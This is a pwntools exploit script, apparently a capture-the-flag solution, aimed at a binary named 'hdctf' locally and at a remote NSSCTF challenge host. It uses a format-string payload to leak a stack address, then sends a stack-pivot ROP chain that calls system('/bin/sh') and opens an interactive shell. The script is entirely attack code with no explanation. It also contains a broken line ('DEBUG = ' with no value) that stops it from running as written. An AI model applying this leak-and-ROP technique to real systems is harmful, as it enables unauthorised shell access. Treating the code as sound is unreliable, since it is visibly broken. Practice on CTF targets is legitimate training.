from pwn import *
import sys
remote_addr = ["node2.anna.nssctf.cn",28375]
#libc = ELF('')
elf = ELF('./hdctf')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./hdctf")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

pop_rdi = 0x4008d3
system = 0x40085d

debug()
payload = b'%16$p'
sa(b'name: \n', payload)
ru(b'hello,')
leak_addr = int(rc(14), 16)
pr('leak_addr', leak_addr)
stack_addr = leak_addr - 0x60
payload = p64(pop_rdi) + p64(stack_addr + 0x18) + p64(system) + b'/bin/sh\x00'
payload = payload.ljust(0x50, b'a') + p64(stack_addr - 8) + p64(0x4007f2)
pause()
s(payload)

shell()
